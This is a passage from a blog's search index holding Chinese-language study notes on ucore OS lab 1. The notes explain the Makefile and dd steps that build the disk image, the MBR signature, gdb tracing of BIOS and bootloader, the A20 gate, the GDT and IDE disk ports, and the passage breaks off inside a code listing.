<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ucore第一章及相关拓展</title>
      <link href="/2020/03/10/ucore%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%8B%93%E5%B1%95/"/>
      <url>/2020/03/10/ucore%E7%AC%AC%E4%B8%80%E7%AB%A0%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%8B%93%E5%B1%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文是很久前做ucore实验时写的笔记，之前未上传至博客。文章记录了ucore第一章的实验内容（由于基础知识差，实验进度过慢，超出预期）。同时做了如Makefile知识的拓展。</p></blockquote><h2 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h2><blockquote><p>主要是系统启动和初始化的调试、编程实验。</p></blockquote><h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><h4 id="1-1-1"><a href="#1-1-1" class="headerlink" title="1.1.1"></a>1.1.1</h4><blockquote><p>操作系统镜像文件ucore.img是如何一步一步生成的？(需要比较详细地解释Makefile中每一条相关命令和命令参数的含义，以及说明命令导致的结果)</p></blockquote><p>练习1的第一个问题要求理解makefile命令、分析ucore.img的生成过程，之前在学习win32汇编时接触过基本的makefile，现在需要完整阅读一遍（实验中的makefile将近300行），在网上找到了《跟我一起写Makefile》这本书，不到100页，先通读一遍吧。</p><p>makefile文件指定了整个项目的源文件编译顺序，可以规定源文件先后编译的顺序、是否重复编译、甚至可以执行操作系统命令。一旦makefile写成，只需要执行make命令就可以自动化编译整个大型项目。对于大量的中间文件，一般将其分类打包，Windows下为.lib，UNIX下为.a。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target ... : prerequisites ...</span><br><span class="line">    command</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>上述语句描述了一个文件的依赖关系，即target（目标文件或可执行文件）依赖于prerequisites中的文件，其生成规则依赖于command，用书中的话说，<code>prerequisites 中如果有一个以上的文件比target 文件要新的话，command 所定义的命令就会被执行。</code></p><p>makefile中，通过定义形如<code>obj = 1.o 2.o 3.o</code>的变量来表示重复出现的文件，并通过<code>$(obj)</code>的方式来使用，类似C语言的宏。make会将.c文件自动添加到.o文件的依赖关系中，因此</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123.o : 123.c 456.h</span><br><span class="line">    cc -c 123.c</span><br></pre></td></tr></table></figure><p>可以被简写为<code>123.o : 456.h</code>（其中cc -c是编译生成.o文件而不链接的选项）。<code>.PHONY : clean</code>表示clean是一个伪目标。</p><p>makefile内容分类：</p><ol><li>显式规则：说明如何生成目标文件。</li><li>隐式规则：make具有推导功能，因此有些规则可以简化。</li><li>定义变量：见上文。</li><li>文件指示；见下文。</li><li>注释：使用#来注释，只有行注释。</li></ol><p>makefile命名：最好使用”Makefile”。</p><p>通过make -n命令，能够只显示命令而不执行，常用于调试makefile，-s参数用于禁止命令显示。</p><p>命令行前加上减号会忽视命令错误。make -i会忽视所有命令错误。</p><p>基本的东西看得差不多，下面来分析lab1的Makefile，找了几个有代表性的例子：</p><ol><li>形如<code>SPACE := $(EMPTY) $(EMPTY)</code>，:=定义变量，注意使用此符号定义的变量不能使用在其后定义的变量。$()用来使用变量，注意这里的SPACE等于两个EMPTY中间夹着的空格。makefile里面的#会被作为每行的终止符，因此这里也可以用<code>\$(EMPTY) #</code>的方式定义SPACE。</li><li><code>ifndef ... endif</code>和C语言中作用相似，makefile中支持此类条件判断。</li><li><code>GCCPREFIX := $(shell ... )</code>表示函数调用，其格式可以是<code>$(&lt;function&gt; &lt;arguments&gt;)</code>也可以是<code>${&lt;function&gt; &lt;arguments&gt;}</code>。顺便提一下shell命令里面经常出现的<code>2&gt;&amp;1</code>，Linux中0表示标准输入，1表示标准输出，2表示错误输出，&gt;表示重定向，符号左侧重定向到右侧，经常用这个符号将屏幕上的输出重定向到文件里查看，如<code>echo &quot;123&quot; &gt; 1.txt</code>，&amp;表示等同于，则<code>2&gt;&amp;1</code>的意思就是2的输出重定向等同于1，对于&amp;1更准确的说应该是文件描述符1。而还有一个经常伴随着上述命令出现的就是<code>&gt;/dev/null</code>，/dev/null相当于只写文件，写入此文件的输入相当于被丢弃，因此这两个命令连着使用，作用结果就是没有标准输出和错误输出了。</li><li><code>.SUFFIXES: .c .S .h</code>，通过伪目标定义后缀列表，默认列表的后缀名很多，这里重新定义了列表内容。</li><li><p>在ucore.img的生成过程中，使用了Linux的dd命令，这个命令以前在做CTF的隐写题时候用到过（用来切割文件），这里使用dd来拼接文件，dd参数的详细说明如下：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>=文件名：输入文件名，缺省为标准输入。即指定源文件。&lt; <span class="keyword">if</span>=input file &gt;</span><br><span class="line">of=文件名：输出文件名，缺省为标准输出。即指定目的文件。&lt; of=output file &gt;</span><br><span class="line">ibs=bytes：一次读入bytes个字节，即指定一个块大小为bytes个字节。</span><br><span class="line">obs=bytes：一次输出bytes个字节，即指定一个块大小为bytes个字节。</span><br><span class="line">bs=bytes：同时设置读入/输出的块大小为bytes个字节。</span><br><span class="line">cbs=bytes：一次转换bytes个字节，即指定转换缓冲区大小。</span><br><span class="line">skip=blocks：从输入文件开头跳过blocks个块后再开始复制。</span><br><span class="line">seek=blocks：从输出文件开头跳过blocks个块后再开始复制。</span><br><span class="line">注意：通常只用当输出文件是磁盘或磁带时才有效，即备份到磁盘或磁带时才有效。</span><br><span class="line">count=blocks：仅拷贝blocks个块，块大小等于ibs指定的字节数。</span><br><span class="line">conv=conversion：用指定的参数转换文件。</span><br><span class="line">    ascii：转换ebcdic为ascii</span><br><span class="line">    ebcdic：转换ascii为ebcdic</span><br><span class="line">    ibm：转换ascii为alternate ebcdic</span><br><span class="line">    block：把每一行转换为长度为cbs，不足部分用空格填充</span><br><span class="line">    unblock：使每一行的长度都为cbs，不足部分用空格填充</span><br><span class="line">    lcase：把大写字符转换为小写字符</span><br><span class="line">    ucase：把小写字符转换为大写字符</span><br><span class="line">    swab：交换输入的每对字节</span><br><span class="line">    noerror：出错时不停止</span><br><span class="line">    notrunc：不截短输出文件</span><br><span class="line">    sync：将每个输入块填充到ibs个字节，不足部分用空（NUL）字符补齐。</span><br></pre></td></tr></table></figure><p> ucore.img合并的具体内容如下：</p> <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UCOREIMG := <span class="variable">$(<span class="built_in">call</span> totarget,ucore.img)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(UCOREIMG)</span>: <span class="variable">$(kernel)</span> <span class="variable">$(bootblock)</span></span><br><span class="line">    <span class="variable">$(V)</span>dd if=/dev/zero of=<span class="variable">$@</span> count=10000</span><br><span class="line">    <span class="variable">$(V)</span>dd if=<span class="variable">$(bootblock)</span> of=<span class="variable">$@</span> conv=notrunc</span><br><span class="line">    <span class="variable">$(V)</span>dd if=<span class="variable">$(kernel)</span> of=<span class="variable">$@</span> seek=1 conv=notrunc</span><br></pre></td></tr></table></figure><p> 这里用到的$@属于makefile中的自动化变量，用于表示规则中的目标文件集。默认bs大小为512B（一个扇区的大小），则第一个dd向ucore.img中填充了5120000bytes大小的0字节。第二个dd向第一个扇区（对应磁盘映像的MBR）复制编译生成的bootblock，第三个dd向img第二个扇区写入kernel，三个dd命令完成ucore.img的制作。</p><p> 实验1.1暂时记录到这里，其中kernel和引导文件（bootblock）的make过程暂时不分析，因为具体功能还没搞懂，make中这两个文件打印出的编译过程就是最基础的makefile里面的依赖关系，涉及文件不多，很容易分析，这个等到以后分析具体文件内容的时候再看。</p></li></ol><h4 id="1-1-2"><a href="#1-1-2" class="headerlink" title="1.1.2"></a>1.1.2</h4><blockquote><p>一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？</p></blockquote><p>由前面的分析（和百度，:)）可知，首先主引导扇区的大小是一个扇区大小，即512bytes。用010editor查看bootblock可以发现，其偏移0x1fe处是55，偏移0x1ff处是aa。为了验证<code>55 aa</code>是否是主引导扇区的最后两字节的固定结尾格式，需要分析bootblock的源码（有点尴尬，前面刚刚说了暂不分析的……）。首先根据make的输出，找到bootblock的编译过程如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+ cc boot/bootasm.S</span><br><span class="line">gcc -Iboot/ -march=i686 -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Os -nostdinc -c boot/bootasm.S -o obj/boot/bootasm.o</span><br><span class="line">+ cc boot/bootmain.c</span><br><span class="line">gcc -Iboot/ -march=i686 -fno-builtin -fno-PIC -Wall -ggdb -m32 -gstabs -nostdinc  -fno-stack-protector -Ilibs/ -Os -nostdinc -c boot/bootmain.c -o obj/boot/bootmain.o</span><br><span class="line">+ cc tools/sign.c</span><br><span class="line">gcc -Itools/ -g -Wall -O2 -c tools/sign.c -o obj/sign/tools/sign.o</span><br><span class="line">gcc -g -Wall -O2 obj/sign/tools/sign.o -o bin/sign</span><br><span class="line">+ ld bin/bootblock</span><br><span class="line">ld -m    elf_i386 -nostdlib -N -e start -Ttext 0x7C00 obj/boot/bootasm.o obj/boot/bootmain.o -o obj/bootblock.o</span><br></pre></td></tr></table></figure><p>首先是根据bootasm.S编译生成bootasm.o，再将bootmain.c编译生成bootmain.o，然后编译sign.c生成中间文件sign.o，再生成执行文件sign，最后将bootmain.o和bootasm.o链接成bootblock.o。这里开始疑惑了一下sign是干什么的，经过搜索发现sign的使用写在了makefile里，make时没有输出，于是回到makefile寻找：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># create bootblock</span></span><br><span class="line">bootfiles = <span class="variable">$(<span class="built_in">call</span> listf_cc,boot)</span></span><br><span class="line"><span class="variable">$(<span class="built_in">foreach</span> f,<span class="variable">$(bootfiles)</span>,$(<span class="built_in">call</span> cc_compile,<span class="variable">$(f)</span>,<span class="variable">$(CC)</span>,<span class="variable">$(CFLAGS)</span> -Os -nostdinc)</span>)</span><br><span class="line"></span><br><span class="line">bootblock = <span class="variable">$(<span class="built_in">call</span> totarget,bootblock)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(bootblock)</span>: <span class="variable">$(<span class="built_in">call</span> toobj,<span class="variable">$(bootfiles)</span>)</span> | <span class="variable">$(<span class="built_in">call</span> totarget,sign)</span></span><br><span class="line">    @echo + ld <span class="variable">$@</span></span><br><span class="line">    <span class="variable">$(V)</span><span class="variable">$(LD)</span> <span class="variable">$(LDFLAGS)</span> -N -e start -Ttext 0x7C00 <span class="variable">$^</span> -o <span class="variable">$(<span class="built_in">call</span> toobj,bootblock)</span></span><br><span class="line">    @<span class="variable">$(OBJDUMP)</span> -S <span class="variable">$(<span class="built_in">call</span> objfile,bootblock)</span> &gt; <span class="variable">$(<span class="built_in">call</span> asmfile,bootblock)</span></span><br><span class="line">    @<span class="variable">$(OBJCOPY)</span> -S -O binary <span class="variable">$(<span class="built_in">call</span> objfile,bootblock)</span> <span class="variable">$(<span class="built_in">call</span> outfile,bootblock)</span></span><br><span class="line">    @<span class="variable">$(<span class="built_in">call</span> totarget,sign)</span> <span class="variable">$(<span class="built_in">call</span> outfile,bootblock)</span> <span class="variable">$(bootblock)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> create_target,bootblock)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create 'sign' tools</span></span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> add_files_host,tools/sign.c,sign,sign)</span></span><br><span class="line"><span class="variable">$(<span class="built_in">call</span> create_target_host,sign,sign)</span></span><br><span class="line"><span class="comment"># -------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><p>大致可以看出sign是一个工具型的程序，将bootblock.o处理了一下，话不多说，看sign.c源码。可以看出，sign.c主要是将输入的文件大小扩充至512字节，并且在末尾补充了<code>55 aa</code>两个字节，验证了上面的想法。</p><p>则被系统认为是符合规范的硬盘主引导扇区的特征应当包含下列特点：</p><ol><li>位置：位于物理上的第一个扇区。</li><li>大小：引导程序小于512字节（启动代码446bytes+硬盘分区表16*4bytes），但占用空间大小固定为512字节，引导程序外的部分用0字节填充。</li><li>字节标识：以<code>55 AA</code>结尾。</li></ol><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>记了不少实验的拓展内容，因为以前对makefile很不了解，对bootloader也没有去研究，所以这一部分实验内容相比拓展内容要少得多。记录这篇笔记的初衷是记录学习、开发kernel的过程，不单纯是ucore系列实验的实验报告，所以经常想到哪写到哪。笔记写作过程中可能出现的的语法、用词的错误难以避免，等笔记完成后再进行整理吧。<em>– 20190928</em></p><h3 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h3><blockquote><p>使用qemu执行并调试lab1中的软件</p></blockquote><h4 id="1-2-1"><a href="#1-2-1" class="headerlink" title="1.2.1"></a>1.2.1</h4><blockquote><p>从CPU加电后执行的第一条指令开始，单步跟踪BIOS的执行。</p></blockquote><p>通过实验提供的makefile，执行make debug的时候会出现gdb启动失败的情况，原因未知，只好手动开启、初始化gdb。（20190929）终于解决了一个困扰了两天的问题：make debug莫名失败……解决方法也很简单，在gnome-terminal前面加上sudo就好了。不太清楚为什么一定要加sudo，我明明是root下进行的make…还有就是这种方式启动的gdb如果加上-tui会有编码显示的问题（可能是由于我安装了peda插件），加上因为有peda插件，索性把-tui去掉。</p><p>首先make debug，接着gdb会停到0xfff0处，此时查看cs寄存器<code>i r cs</code>，cs值为0xf000，根据16位汇编寻址方式，当前要执行的指令实际为<code>jmp    0xf000:0xe05b</code>。<br>不清楚为什么peda不会根据段寄存器显示反汇编指令，可能是没有考虑实模式的调试吧？peda的代码段就显示了下面这个样子：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">=&gt; <span class="number">0xfff0</span>:  <span class="keyword">add</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">bx</span>+<span class="built_in">si</span>],<span class="built_in">al</span></span><br><span class="line">   <span class="number">0xfff2</span>:  <span class="keyword">add</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">bx</span>+<span class="built_in">si</span>],<span class="built_in">al</span></span><br><span class="line">   <span class="number">0xfff4</span>:  <span class="keyword">add</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">bx</span>+<span class="built_in">si</span>],<span class="built_in">al</span></span><br></pre></td></tr></table></figure><p>si单步执行机器指令，程序跳转到0xe05b，查看指令：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xfe05b</span>: <span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> <span class="built_in">cs</span>:<span class="number">0x6574</span>,<span class="number">0x0</span></span><br><span class="line"><span class="number">0xfe062</span>: <span class="keyword">jne</span>    <span class="number">0xfd2b6</span></span><br><span class="line"><span class="number">0xfe066</span>: <span class="keyword">xor</span>    <span class="built_in">ax</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="number">0xfe068</span>: <span class="keyword">mov</span>    <span class="built_in">ss</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="number">0xfe06a</span>: <span class="keyword">mov</span>    <span class="built_in">esp</span>,<span class="number">0x7000</span></span><br><span class="line"><span class="number">0xfe070</span>: <span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0xf3c24</span></span><br><span class="line"><span class="number">0xfe076</span>: <span class="keyword">jmp</span>    <span class="number">0xfd124</span></span><br></pre></td></tr></table></figure><h4 id="1-2-2-1-2-3"><a href="#1-2-2-1-2-3" class="headerlink" title="1.2.2 - 1.2.3"></a>1.2.2 - 1.2.3</h4><blockquote><p>在初始化位置0x7c00设置实地址断点,测试断点正常。<br>从0x7c00开始跟踪代码运行,将单步跟踪反汇编得到的代码与bootasm.S和bootblock.asm进行比较。</p></blockquote><p>进入gdb后，<code>b *0x7c00</code>，然后继续运行</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">=&gt; <span class="number">0x7c00</span>:  <span class="keyword">cli</span></span><br><span class="line">   <span class="number">0x7c01</span>:  <span class="keyword">cld</span></span><br><span class="line">   <span class="number">0x7c02</span>:  <span class="keyword">xor</span>    <span class="built_in">ax</span>,<span class="built_in">ax</span></span><br><span class="line">   <span class="number">0x7c04</span>:  <span class="keyword">mov</span>    <span class="built_in">ds</span>,<span class="built_in">ax</span></span><br><span class="line">   <span class="number">0x7c06</span>:  <span class="keyword">mov</span>    <span class="built_in">es</span>,<span class="built_in">ax</span></span><br></pre></td></tr></table></figure><p>可以看出，0x7c00处执行的内容就是bootasm.S。</p><h4 id="1-2-4"><a href="#1-2-4" class="headerlink" title="1.2.4"></a>1.2.4</h4><blockquote><p>自己找一个bootloader或内核中的代码位置，设置断点并进行测试。</p></blockquote><p>导入了符号表后，<code>b kern_init</code>在内核初始化位置下断点。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">=&gt; <span class="number">0x100000</span> &lt;kern_init&gt;:    <span class="keyword">push</span>   <span class="built_in">bp</span></span><br><span class="line">   <span class="number">0x100001</span> &lt;kern_init+<span class="number">1</span>&gt;:  <span class="keyword">mov</span>    <span class="built_in">bp</span>,<span class="built_in">sp</span></span><br><span class="line">   <span class="number">0x100003</span> &lt;kern_init+<span class="number">3</span>&gt;:  <span class="keyword">sub</span>    <span class="built_in">sp</span>,<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x100006</span> &lt;kern_init+<span class="number">6</span>&gt;:  <span class="keyword">mov</span>    <span class="built_in">dx</span>,<span class="number">0xfd20</span></span><br><span class="line">   <span class="number">0x100009</span> &lt;kern_init+<span class="number">9</span>&gt;:  <span class="keyword">adc</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">bx</span>+<span class="built_in">si</span>],<span class="built_in">al</span></span><br></pre></td></tr></table></figure><p>可以看到内核被装载到了0x100000处，经过一些启动函数调用后，程序进入循环状态。</p><h3 id="练习3"><a href="#练习3" class="headerlink" title="练习3"></a>练习3</h3><blockquote><p>分析bootloader进入保护模式的过程。</p></blockquote><p>首先要理解A20 Gate的概念。在8086时代，地址线一共20根，因此计算机最多访问1M的地址。但是由于8086是16位结构，传输、处理的地址最多只能是16位的（64k），所以引入了段寄存器，用段地址和偏移地址共同表示物理地址，但是此时又有了新问题：段寄存器和偏移地址寄存器最大都是0xffff，其能表示的物理地址为0xffff0+0xffff=0x10ffef，比0x100000多出了0xffef，所以8086在处理0x100001~0x10ffef的这段不存在的物理地址时，会实际上将其模0x100000，用一种循环的方式解决掉了多余的地址。而后80286被设计的时候，地址线达到了24根，为了兼容需要取消这个取模的机制——24根地址线能表示的地址大小包括了0x100001~0x10ffef。所以IBM利用键盘控制器8042单片机（现已被集成在南桥芯片里）在第21根地址线上加了一个开关，当高于1M的地址被使用时，开关置1，访问0x100001~0x10ffef或更高的地址时不会进行取模运算，开关置0的时候，禁止了第21根地址线（A20）的使用，所以这个开关就叫做A20 Gate。</p><p>在保护模式下，如果A20 Gate还是关闭状态，那么A20恒为0，这样所能表示的地址只能是奇数兆，显然，在保护模式下，应当使能A20 Gate。使得高位地址能够被正常访问，因此在操作系统启动的时候就应该考虑将A20 Gate启动，也就是说要操作8042。</p><p>8042有四个8位寄存器，有两个端口地址60H和64H。其中四个寄存器分别为：</p><ol><li>输入缓冲，只写</li><li>输出缓冲，只读</li><li>状态寄存器，只读</li><li>控制寄存器，可读写</li></ol><p>60H端口既可以读也可以写，其具体控制由控制寄存器实现，20H是读，60H是写。<br>8042里面还有三个内部端口，其中，Output Port的第一个比特位就是A20 Gate。<br>读Output Port：向64h发送d0h命令，然后从60h读取Output Port的内容。<br>写Output Port：向64h发送d1h命令，然后向60h写入Output Port的数据。<br>禁止键盘操作：向64h发送adh<br>打开键盘操作：向64h发送aeh</p><p>状态寄存器的值：<br>|bit|meaning|<br>|—|—|<br>|0|output register (60h) 中有数据|<br>|1|input register (60h/64h) 有数据|<br>|2|系统标志（上电复位后被置为0）|<br>|3|data in input register is command (1) or data (0)|<br>|4|1=keyboard enabled, 0=keyboard disabled (via switch)|<br>|5|1=transmit timeout (data transmit not complete)|<br>|6|1=receive timeout (data transmit not complete)|<br>|7|1=even parity rec’d, 0=odd parity rec’d (should be odd)|</p><p>带着上述知识，查看bootasm.S的相关部分。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">seta20.1:</span></span><br><span class="line">    inb <span class="number">$0</span>x64, %al      # Wait for <span class="keyword">not</span> busy(<span class="number">8042</span> input buffer empty).</span><br><span class="line">    testb <span class="number">$0</span>x2, %al</span><br><span class="line">    <span class="keyword">jnz</span> seta20<span class="meta">.1</span></span><br><span class="line"></span><br><span class="line">    movb <span class="number">$0</span>xd1, %al     # <span class="number">0xd1</span> -&gt; port <span class="number">0x64</span></span><br><span class="line">    outb %al, <span class="number">$0</span>x64     # <span class="number">0xd1</span> means: write data to <span class="number">8042</span><span class="string">'s P2 port</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">seta20.2:</span></span><br><span class="line"><span class="string">    inb $0x64, %al      # Wait for not busy(8042 input buffer empty).</span></span><br><span class="line"><span class="string">    testb $0x2, %al</span></span><br><span class="line"><span class="string">    jnz seta20.2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    movb $0xdf, %al     # 0xdf -&gt; port 0x60</span></span><br><span class="line"><span class="string">    outb %al, $0x60     # 0xdf = 11011111, means set P2'</span>s A20 bit(the <span class="number">1</span> bit) to <span class="number">1</span></span><br></pre></td></tr></table></figure><p>seta20.1: 第一行读状态寄存器，第二行将状态寄存器值测试and 0x2，检测状态寄存器倒数第二位的值，判断input register是否有数据，如果有，则zf置0，jnz发生跳转，直到没有数据。下两行代码将0xd1输入64H端口，表示接下来要操作8042内部的Output Port。接着继续等待输入缓冲不被占用，将0xdf（$11011111_2$）写入60端口，完成A20 Gate的开启。</p><p>接下来需要学习GDT的相关内容。保护模式下的段表有GDT（Global Descriptor Table）和LDT（Local Descriptor Table）。ucore里没有实现LDT，所以关注点仅聚集在GDT上。首先要先了解保护模式下的内存管理机制。保护模式实现了进程之间的安全隔离又保证了进程间的资源共享，在8086环境下，程序可以直接访问物理地址，程序之间可以直接互相修改内存内容，显然是不安全的。保护模式下的内存管理又可以分为分段和分页。</p><p>分段管理机制下，系统将内存划分为由起始位置和长度组成的块结构，称之为段，这里的段的含义和汇编中的代码段、数据段、堆、栈的含义一致。在实模式下，段地址和偏移量计算直接得到物理地址，在分段管理下，原本存放段地址的段寄存器内容变成了一个索引，这个索引用于定位段描述符表（也就是GDT和LDT共同的部分，DT）的表项。表项中存储着段描述符，段描述符包括了一个段基址，CPU取出这个基址，加上偏移地址，得到了一个地址，叫做线性地址，而后由操作系统将其转换为物理地址。指示CPU取出段描述符的地址叫做逻辑地址，逻辑地址是程序员在编程时所使用的。</p><p>接着说段描述符。一个段由三个参数确定：基地址、界限、属性。其中界限相当于段大小。三个参数中段的属性不好理解，它的作用是确定段的性质（废话）。段属性包含的一个内容叫做粒度位（Granularity），通常用G表示，G=0表示段界限以字节位位单位，20位的界限可表示的范围是1字节至1M字节，增量为1字节；G=1表示段界限以4K字节为单位，于是20位的界限可表示的范围是4K字节至4G字节，增量为4K字节。</p><p>段属性中的类型表示段是代码段还是数据段、段的rwx权限、段的增长方向等等。除此以外还有多个段属性，不作讨论。</p><p>全局描述符表是一个保存多个段描述符的“数组”，其起始地址保存在全局描述符表寄存器GDTR中。GDTR长48位，其中高32位为基地址，低16位为段界限。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lgdt</span> gdtdesc # 将gdtesc加载到gdt</span><br><span class="line">movl %cr0, %eax # <span class="built_in">CR0</span>置<span class="number">1</span>，保护模式启动</span><br><span class="line">orl $CR0_PE_ON, %eax</span><br><span class="line">movl %eax, %cr0</span><br></pre></td></tr></table></figure><p>开启A20 Gate后，加载gdt，将cr0置1，接下来初始化内核运行环境（设置段寄存器），最后启动内核。</p><h3 id="练习4"><a href="#练习4" class="headerlink" title="练习4"></a>练习4</h3><blockquote><p>通过阅读bootmain.c，了解bootloader如何加载ELF文件。通过分析源代码和通过qemu来运行并调试bootloader&amp;OS.</p></blockquote><p>实验指导书上关于这部分的说明理解起来有点困难（没有接触过硬盘相关的知识），所以对照原文一个个词汇去查。</p><p><code>bootloader让CPU进入保护模式后，下一步的工作就是从硬盘上加载并运行OS。考虑到实现的简单性，bootloader的访问硬盘都是LBA模式的PIO（Program IO）方式，即所有的IO操作是通过CPU访问硬盘的IO地址寄存器完成。</code></p><p>LBA(Logical Block Address)，即逻辑区块地址，LBA可以意指某个数据区块的地址或是某个地址所指向的数据区块。电脑上所谓一个逻辑区块通常是512或1024位组。ISO-9660格式的标准CD则以2048位组为一个逻辑区块大小。</p><p>一般主板有2个IDE通道，每个通道可以接2个IDE硬盘。访问第一个硬盘的扇区可设置IO地址寄存器0x1f0-0x1f7实现的，具体参数见下表。一般第一个IDE通道通过访问IO地址0x1f0-0x1f7来实现，第二个IDE通道通过访问0x170-0x17f实现。每个通道的主从盘的选择通过第6个IO偏移地址寄存器来设置。</p><table><thead><tr><th>IO地址</th><th>功能</th></tr></thead><tbody><tr><td>0x1f0</td><td>读数据，当0x1f7不为忙状态时，可以读。</td></tr><tr><td>0x1f2</td><td>要读写的扇区数，每次读写前，你需要表明你要读写几个扇区。最小是1个扇区</td></tr><tr><td>0x1f3</td><td>如果是LBA模式，就是LBA参数的0-7位</td></tr><tr><td>0x1f4</td><td>如果是LBA模式，就是LBA参数的8-15位</td></tr><tr><td>0x1f5</td><td>如果是LBA模式，就是LBA参数的16-23位</td></tr><tr><td>0x1f6</td><td>第0~3位：如果是LBA模式就是24-27位 第4位：为0主盘；为1从盘</td></tr><tr><td>0x1f7</td><td>状态和命令寄存器。操作时先给命令，再读取，如果不是忙状态就从0x1f0端口读数据</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">waitdisk</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> ((inb(<span class="number">0x1F7</span>) &amp; <span class="number">0xC0</span>) != <span class="number">0x40</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bootmain里面的waitdisk函数就利用0x1f7这个地址判断磁盘是否为忙状态，循环从0x1f7读取一个字节，保留从低到高第七位第八位，与$(0100\space0000)_2$进行比较，相等表示磁盘空闲，退出循环。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 